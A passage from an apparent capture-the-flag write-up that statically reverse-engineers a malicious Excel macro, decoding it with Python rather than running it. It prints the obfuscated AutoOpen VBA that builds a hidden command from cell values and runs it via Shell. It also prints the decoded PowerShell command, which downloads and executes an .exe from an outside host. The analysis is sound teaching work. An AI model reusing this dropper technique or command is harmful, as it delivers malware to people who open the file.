{{< code language="visual-basic" title="Module1.bas lines:10-14" expand="expand" collapse="hide" isCollapsed="false">}}	' Seed the random number generator
    Randomize
    
    ' Loop through each cell in the range and fill with random base64 strings
    For i = 1 To rng.Cells.Count
        base64String = GenerateRandomBase64()
        rng.Cells(i).Value = base64String
    Next i
{{< /code >}}

It turns out they seed a random number generator, and then proceed to fill all 2,700 cells with random Base64 strings! To do this they utilize a the function they define in this module in lines ```26``` through ```40``` aptly called ```GenerateRandomBase64()```. This is done for 3 major reasons:

1. Fill the cells of data in a programatic and random way
2. Ensure that the spreadsheet is easily regenerated with different data
3. Change the hash/signature of the file should you want to reuse the spreadsheet

{{< code language="visual-basic" title="Module1.bas lines:26-40" expand="expand" collapse="hide" isCollapsed="false">}}Function GenerateRandomBase64() As String
    Dim base64Chars As String
    Dim i As Integer
    Dim base64String As String
    
    ' Define Base64 characters
    base64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    
    ' Generate random Base64 string
    For i = 1 To 8 ' Generates an 8-character Base64 string (which would correspond to 6 bytes of data)
        base64String = base64String & Mid(base64Chars, Int((Len(base64Chars) * Rnd) + 1), 1)
    Next i
    
    GenerateRandomBase64 = base64String
End Function
{{< /code >}}

This function generates an 8 character long random string that contains the Base64 characters, **BUT** while a scanner may think that these are all valid Base64 encoded strings, these turn out to be just random noise and a lot of it. While this module doesn't actually hide a payload, it does create a lot of Base64 data that could be overwhelming to analyze by simply having so much data to look over. Had we not found this script, or had it been more obfuscated or even deleted afterwards, we could've spent (wasted) some time attempting to decode the data to see if we can find some potentially harmful strings, or other IOCs. Thankfully our procrastination paid off! Now onto the second module!

#### Step 4. This is where the fun begins...
In the aptly named ```Module2.bas``` we see that is where the magic happens. The script looks complicated, but reading it is actually pretty straight forward. Starting at the beginning (because we live in a society) we see several things, namely the word ```Dim```. Now this is not referring to how my exgirlfriend would describe me, but rather it is the VBA way to declare a variable. So in this truncated snippet we see several variables being declared with their type being ```String```. These variables are:

```t53df028c67b2f07f1069866e345c8b85, qe32cd94f940ea527cf84654613d4fb5d, e5b138e644d624905ca8d47c3b8a2cf41, tfd753b886f3bd1f6da1a84488dee93f9, z92ea38976d53e8b557cd5bbc2cd3e0f8, xc6fd40b407cb3aac0d068f54af14362e```

While normal people may use descriptive variable names in either camelCase or snake_case (the obviously superior naming convention), for obfuscation purposes the authors of this malicious macro decided to use *very* long variable names to make it that much more difficult to understand what is happening. But thankfully their Kung-Fu is weak and we can see what is happening with just a little patience. 

Focusing on just the first few lines of code we see that like all good malicious macros, it has the ```AutoOpen()``` function that runs whenever the spreadsheet is opened and macros are enabled. Immediately below that we start declaring the empty variable ```f``` of type ```String``` and more importantly the variable ```xc6fd40b407cb3aac0d068f54af14362e``` also of type ```String``` but this time with the value ```$OrA, ```. We then have **SEVERAL** ```IF/End If``` blocks where the statement checks several cells for a particular value, and if the cell has that value, we append a string to a variable such as ```xc6fd40b407cb3aac0d068f54af14362e```. 

{{< code language="visual-basic" title="Module2.bas lines:1-11" expand="expand" collapse="hide" isCollapsed="false">}}Sub AutoOpen()
Dim Retval
Dim f As String
Dim t53df028c67b2f07f1069866e345c8b85, qe32cd94f940ea527cf84654613d4fb5d, e5b138e644d624905ca8d47c3b8a2cf41, tfd753b886f3bd1f6da1a84488dee93f9, z92ea38976d53e8b557cd5bbc2cd3e0f8, xc6fd40b407cb3aac0d068f54af14362e As String
xc6fd40b407cb3aac0d068f54af14362e = "$OrA, "
If Sheets("Sheet2").Range("M62").Value = "Iuzaz/iA" Then
xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + "$jri);"
End If
If Sheets("Sheet2").Range("G80").Value = "bAcDPl8D" Then
xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + "Invok"
End If
...
If Sheets("Sheet2").Range("E90").Value = "HP5LRFms" Then
e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "e';$"
End If
...
If Sheets("Sheet2").Range("T34").Value = "9u2uF9nM" Then
qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "t Ne"
End If
{{< /code >}}

In other words, the whole document programatically fills ```Sheet2``` with random snippets of base64 strings, and ```Module2.bas``` goes and looks at specific cells within ```Sheet2```, and if they have a particular value, it starts to build a string and it does this for several variables such as ```e5b138e644d624905ca8d47c3b8a2cf41``` and ```qe32cd94f940ea527cf84654613d4fb5d```. 

At the end of the ```IF/End If``` blocks in ```Module2.bas``` we see the script builds the malicious string in the correct order by concatenating the strings in each of the variables it built into the variable ```f```, and then executes it with ```Shell(f,0)```. It will never cease to baffle me why VBA can just run a shell, but yet here we are:

{{< code language="visual-basic" title="Module2.bas" expand="expand" collapse="hide" isCollapsed="false">}}...
f = t53df028c67b2f07f1069866e345c8b85 + qe32cd94f940ea527cf84654613d4fb5d + e5b138e644d624905ca8d47c3b8a2cf41 + tfd753b886f3bd1f6da1a84488dee93f9 + z92ea38976d53e8b557cd5bbc2cd3e0f8 + xc6fd40b407cb3aac0d068f54af14362e
Retval = Shell(f, 0)
...
{{< /code >}}

Now I know this is confusing, but let me use a Python example. 

Say we have an array of length 10 with the following data:

{{< code language="python" title="malicious_macro.py" expand="expand" collapse="hide" isCollapsed="false">}}my_array = ["a","b","c","d","e","f","g","h","i","j"]
{{< /code >}}

And from this array I write the following script:
{{< code language="python" title="malicious_macro.py" expand="expand" collapse="hide" isCollapsed="false">}}my_array = ["a","b","c","d","e","f","g","h","i","j"]
mal_string1 = ""
mal_string2 = ""
mal_string3 = ""
if my_array[0] == "a":
    mal_string1 += "llo"
if my_array[1] == "X":
    mal_string2 += "%!#"
if my_array[2] == "b":
    mal_string2 += " Wor"
if my_array[3] == "c":
    mal_string2 += "ld!"
if my_array[9]== "j":
    mal_string3 = "He"

final_string = mal_string3 + mal_string1 + mal_string2
{{< /code >}}

Looking at this script we see that based on the contents of the array, we determine the contents of each variable, and then we build a final variable ```final_string``` from these smaller substrings in whatever order we see fit. We can even add ```If``` statements we know will not be true to confuse an analyst and further obfuscate the script like we see in line 7 with the ```if my_array[1] == "X":``` statment. Ultimaterly we end up building the string ```Hello World!``` but we make it hard for a human to deduce this.

Luckily for me, I am too lazy to read things and would much rather have a computer read stuff for me.

#### Step 5. To YOLO or not to YOLO

At this point I am tempted to modify the VBA script and have it do the dirty work for me by printing the value of that malicious string ```f```, but I am feeling a bit cheeky and instead would like to do it a less YOLO-y way and try to get this string without ever actually opening the spreadsheet in Excel (it *totally* has **nothing** to do with the fact that I am running this on Linux and Mac so I have no way to do this and the fact that I also hate myself enought to do this the hard way).

Looking at the contents in ```Module2.bas``` we thankfully see that all of the ```If/End If``` conditionals to build the malicious string look at the contents of various cells in ```Sheet2``` and don't jump around various sheets. So i think first order of business is to extract those contents. To do this in Kali we will install and use the Python application ```xlsx2csv``` which if the name isn't obvious, converst xlsx contents to a CSV.

So we install it with 
```bash
$ pip install xlsx2csv
```
and then we simply use 
```bash
$ xlsx2csv deals.xlsm --all > deals.csv
```
and we now have the contents of the xlsm file stored as a neat CSV file. The raw dump of this will be avaialble to you at https://github.com/cabanuel/malicious-pro-post-data/blob/main/macro_reverse_engineering/deals.csv

From this CSV we then pull out ```Sheet2``` and we now have a CSV of all the contents of sheet 2. This will be available to you at https://github.com/cabanuel/malicious-pro-post-data/blob/main/macro_reverse_engineering/sheet2.csv and is literally just a lot of base64 snippets separated by commas. Ain't life grand?

Now here is where we hit a bit of a hiccup, the ```Module2.bas``` script looks at the contents of a cell by referenicng its column and then row number in the following format where ```E40``` is column E, row 40. Our CSV does not have that. But that's no problem, because we have Python and Pandas. Now I will say that I took a peek at ```Sheet2.csv``` and saw that there are 27 columns, so in Python when I generate the column names as the capital letters A-Z I do have to append a ```AA``` to that list as a column name. 

{{< code language="python" title="deals.py" expand="expand" collapse="hide" isCollapsed="false">}}import string
import pandas as pd
import numpy as np

col_names = list(string.ascii_uppercase) + ['AA']

df = pd.read_csv('sheet2.csv', names=col_names)
{{< /code >}}

And doing a quick print/sanity check of this we see that it's all coming together nicely.

{{< image src="/img/macro_reverse_engineering/sheet2.png" alt="A freak in the (Excel) sheets" position="center" style="width: 800px; height:auto;" >}}

So now we have the technology. We have the skills (I think). Let's keep building ```deals.py```.

#### Step 6. LEZDUIT!

So now we need to extract what the actual things we care about in ```Module2.bas``` and convert it into python. Thankfully with some regex and Python knowledge this is actually super easy, barely an inconvenience. 

First we need to take those string declarations from VBA:
```
Dim t53df028c67b2f07f1069866e345c8b85, qe32cd94f940ea527cf84654613d4fb5d,
 e5b138e644d624905ca8d47c3b8a2cf41, tfd753b886f3bd1f6da1a84488dee93f9, 
 z92ea38976d53e8b557cd5bbc2cd3e0f8, xc6fd40b407cb3aac0d068f54af14362e As String
```
and we Pythonize them
```python
t53df028c67b2f07f1069866e345c8b85 = ''
qe32cd94f940ea527cf84654613d4fb5d = ''
e5b138e644d624905ca8d47c3b8a2cf41 = ''
tfd753b886f3bd1f6da1a84488dee93f9 = ''
z92ea38976d53e8b557cd5bbc2cd3e0f8 = ''
xc6fd40b407cb3aac0d068f54af14362e = ''
```
next we will take the VBA ```If/End If``` statements such as:
```
If Sheets("Sheet2").Range("M62").Value = "Iuzaz/iA" Then
xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + "$jri);"
End If
```
and Pythonize AND Pandas-ize them! (Note I had to flip the Row/Column notation for Pandas):
```python
if df.at["M",62] == "Iuzaz/iA":
    xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + "$jri);"
```

and finally our malicious string constructor is basically already Pythonized
```python
f = t53df028c67b2f07f1069866e345c8b85 + qe32cd94f940ea527cf84654613d4fb5d + 
e5b138e644d624905ca8d47c3b8a2cf41 + tfd753b886f3bd1f6da1a84488dee93f9 + 
z92ea38976d53e8b557cd5bbc2cd3e0f8 + xc6fd40b407cb3aac0d068f54af14362e
```

so our final ```deals.py``` looks like:
{{< code language="python" title="deals.py" expand="expand" collapse="hide" isCollapsed="false">}}import string
import pandas as pd
import numpy as np

col_names = list(string.ascii_uppercase) + ['AA']

df = pd.read_csv('sheet2.csv', names=col_names)
df.index = np.arange(1, len(df) + 1)

t53df028c67b2f07f1069866e345c8b85 = ''
qe32cd94f940ea527cf84654613d4fb5d = ''
e5b138e644d624905ca8d47c3b8a2cf41 = ''
tfd753b886f3bd1f6da1a84488dee93f9 = ''
z92ea38976d53e8b557cd5bbc2cd3e0f8 = ''
xc6fd40b407cb3aac0d068f54af14362e = ''

print("Data Frame:\n--------")
print(df)

if df.at[62,"M"] == "Iuzaz/iA":
    xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + "$jri);"
if df.at[80,"G"] == "bAcDPl8D":
    xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + "Invok"
e5b138e644d624905ca8d47c3b8a2cf41 = " = '"
if df.at[31,"P"] == "aI3bH4Rd":
    e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "http"
if df.at[50,"B"] == "4L3bnaGQ":
    e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "://f"
if df.at[32,"B"] == "QyycTMPU":
    xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + "e-Ite"
if df.at[47,"K"] == "0kIbOvsu":
    xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + "m $jri"
if df.at[45,"B"] == "/hRdSmbG":
    xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + ";brea"
if df.at[27,"D"] == "y9hFUyA8":
    e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "ruit"
if df.at[91,"A"] == "De5234dF":
    e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + ".ret3"
if df.at[35,"I"] == "DP7jRT2v":
    e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + ".gan"
if df.at[48,"W"] == "/O/w/o57":
    xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + "k;} c"
if df.at[18,"R"] == "FOtBe4id":
    xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + "atch "
if df.at[6,"W"] == "9Vo7IQ+/":
    xc6fd40b407cb3aac0d068f54af14362e = xc6fd40b407cb3aac0d068f54af14362e + "{}"""
if df.at[24,"U"] == "hmDEjcAE":
    e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "g/ma"
if df.at[96,"C"] == "1eDPj4Rc":
    e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "lwar"
if df.at[93,"B"] == "A72nfg/f":
    e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + ".rds8"
if df.at[90,"E"] == "HP5LRFms":
    e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "e';$"
tfd753b886f3bd1f6da1a84488dee93f9 = "akrz"
if df.at[39,"G"] == "MZZ/er++":
    tfd753b886f3bd1f6da1a84488dee93f9 = tfd753b886f3bd1f6da1a84488dee93f9 + "f3zsd"
if df.at[93,"B"] == "ZX42cd+3":
    tfd753b886f3bd1f6da1a84488dee93f9 = tfd753b886f3bd1f6da1a84488dee93f9 + "2832"
if df.at[15,"I"] == "e9x9ME+E":
    tfd753b886f3bd1f6da1a84488dee93f9 = tfd753b886f3bd1f6da1a84488dee93f9 + "0918"
if df.at[46,"T"] == "7b69F2SI":
    tfd753b886f3bd1f6da1a84488dee93f9 = tfd753b886f3bd1f6da1a84488dee93f9 + "2afd"
if df.at[25,"N"] == "Ga/NUmJu":
    e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "CNTA"
if df.at[26,"N"] == "C1hrOgDr":
    e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + " = '"
if df.at[58,"C"] == "PoX7qGEp":
    e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "banA"
if df.at[53,"B"] == "see2d/f":
    e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "Fl0dd"
if df.at[2,"Q"] == "VKVTo5f+":
    e5b138e644d624905ca8d47c3b8a2cf41 = e5b138e644d624905ca8d47c3b8a2cf41 + "NA-H"
t53df028c67b2f07f1069866e345c8b85 = "p"
if df.at[84,"L"] == "GSPMnc83":
    t53df028c67b2f07f1069866e345c8b85 = t53df028c67b2f07f1069866e345c8b85 + "oWe"
if df.at[35,"H"] == "aCxE//3x":
    t53df028c67b2f07f1069866e345c8b85 = t53df028c67b2f07f1069866e345c8b85 + "ACew"
if df.at[95,"R"] == "uIDW54Re":
    t53df028c67b2f07f1069866e345c8b85 = t53df028c67b2f07f1069866e345c8b85 + "Rs"
if df.at[24,"A"] == "PKRtszin":
    t53df028c67b2f07f1069866e345c8b85 = t53df028c67b2f07f1069866e345c8b85 + "HELL"
if df.at[33,"G"] == "ccEsz3te":
    t53df028c67b2f07f1069866e345c8b85 = t53df028c67b2f07f1069866e345c8b85 + "L3c33"
if df.at[31,"P"] == "aI3bH4Rd":
    t53df028c67b2f07f1069866e345c8b85 = t53df028c67b2f07f1069866e345c8b85 + " -c"
if df.at[49,"Z"] == "oKnlcgpo":
    tfd753b886f3bd1f6da1a84488dee93f9 = tfd753b886f3bd1f6da1a84488dee93f9 + "4';$"
if df.at[57,"F"] == "JoTVytPM":
    tfd753b886f3bd1f6da1a84488dee93f9 = tfd753b886f3bd1f6da1a84488dee93f9 + "jri="
if df.at[37,"M"] == "y7MxjsAO":
    tfd753b886f3bd1f6da1a84488dee93f9 = tfd753b886f3bd1f6da1a84488dee93f9 + "$env:"
if df.at[20,"E"] == "ap0EvV5r":
    tfd753b886f3bd1f6da1a84488dee93f9 = tfd753b886f3bd1f6da1a84488dee93f9 + "publ"
z92ea38976d53e8b557cd5bbc2cd3e0f8 = "\'+$"
if df.at[11,"D"] == "Q/GXajeM":
    z92ea38976d53e8b557cd5bbc2cd3e0f8 = z92ea38976d53e8b557cd5bbc2cd3e0f8 + "CNTA"
if df.at[45,"B"] == "/hRdSmbG":
    z92ea38976d53e8b557cd5bbc2cd3e0f8 = z92ea38976d53e8b557cd5bbc2cd3e0f8 + "+'.ex"
if df.at[85,"D"] == "y4/6D38p":
    z92ea38976d53e8b557cd5bbc2cd3e0f8 = z92ea38976d53e8b557cd5bbc2cd3e0f8 + "e';tr"
if df.at[2,"P"] == "E45tTsBe":
    z92ea38976d53e8b557cd5bbc2cd3e0f8 = z92ea38976d53e8b557cd5bbc2cd3e0f8 + "4d2dx"
if df.at[72,"O"] == "lD3Ob4eQ":
    tfd753b886f3bd1f6da1a84488dee93f9 = tfd753b886f3bd1f6da1a84488dee93f9 + "ic+'"
qe32cd94f940ea527cf84654613d4fb5d = "omm"
if df.at[24,"P"] == "d/v8oiH9":
    qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "and"
if df.at[22,"V"] == "dI6oBK/K":
    qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + " """
if df.at[1,"G"] == "zJ1AdN0x":
    qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "$oa"
if df.at[93,"Y"] == "E/5234dF":
    qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "e$3fn"
if df.at[12,"A"] == "X42fc3/=":
    qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "av3ei"
if df.at[57,"F"] == "JoTVytPM":
    qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "K ="
if df.at[99,"L"] == "t8PygQka":
    qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + " ne"
if df.at[31,"X"] == "gGJBD5tp":
    qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "w-o"
if df.at[42,"C"] == "Dq7Pu9Tm":
    qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "bjec"
if df.at[22,"D"] == "X42/=rrE":
    qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "aoX3&i"
if df.at[34,"T"] == "9u2uF9nM":
    qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "t Ne"
if df.at[5,"G"] == "cp+qRR+N":
    qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "t.We"
if df.at[17,"O"] == "Q8z4cV/f":
    qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "bCli"
if df.at[50,"Y"] == "OML7UOYq":
    qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "ent;"
if df.at[41,"P"] == "bG9LxJvN":
    qe32cd94f940ea527cf84654613d4fb5d = qe32cd94f940ea527cf84654613d4fb5d + "$OrA"
if df.at[58,"L"] == "qK02fT5b":
    z92ea38976d53e8b557cd5bbc2cd3e0f8 = z92ea38976d53e8b557cd5bbc2cd3e0f8 + "y{$oa"
if df.at[47,"P"] == "hXelsG2H":
    z92ea38976d53e8b557cd5bbc2cd3e0f8 = z92ea38976d53e8b557cd5bbc2cd3e0f8 + "K.Dow"
if df.at[2,"A"] == "RcPl3722":
    z92ea38976d53e8b557cd5bbc2cd3e0f8 = z92ea38976d53e8b557cd5bbc2cd3e0f8 + "Ry.is"
if df.at[64,"G"] == "Kvap5Ma0":
    z92ea38976d53e8b557cd5bbc2cd3e0f8 = z92ea38976d53e8b557cd5bbc2cd3e0f8 + "nload"
if df.at[76,"H"] == "OjgR3YGk":
    z92ea38976d53e8b557cd5bbc2cd3e0f8 = z92ea38976d53e8b557cd5bbc2cd3e0f8 + "File("

f = t53df028c67b2f07f1069866e345c8b85 + qe32cd94f940ea527cf84654613d4fb5d \
+ e5b138e644d624905ca8d47c3b8a2cf41 + tfd753b886f3bd1f6da1a84488dee93f9 \
+ z92ea38976d53e8b557cd5bbc2cd3e0f8 + xc6fd40b407cb3aac0d068f54af14362e

print("Malicious Command\n--------")
print(f)
{{< /code >}}

and so we run it and we get the malicious command that the flag wanted us to get.
{{< image src="/img/macro_reverse_engineering/malicious_output.png" alt="your Kung Fu was weak." position="center" style="width: 800px; height:auto;" >}}

and here it is in all its glory. Notice that even here they try to do some obfuscation by splitting the URL and putting it out of order ad even trying to obfuscate the word "PowerShell"
```
poWeRsHELL -command $oaK = new-object Net.WebClient;$OrA = 'http://fruit.gang/malware';$CNTA = 'banANA-Hakrz09182afd4';$jri=$env:public+''+$CNTA+'.exe';try{$oaK.DownloadFile($jri);Invoke-Item $jri;break;} catch {}
```
### Final Thoughts
It took me maybe an hour or two to do this challenge the first time, and I remember really enjoying it. It then took me 10 months to write that report. In that time I got married, moved, and have done so much, but I always wanted to come back and write this so that others could go on this same learning experience. Even to this day, malicious macros continue to be a thing and being able to do the analysis of a known malicious document without actually running the document is pretty cool if you ask me. (I am a nerd so you probably shouldn't). Hopefully you enjoyed this, learned something, and if you are still reading this please go outside and touch some grass for me as I continue to push buttons on my computer. 

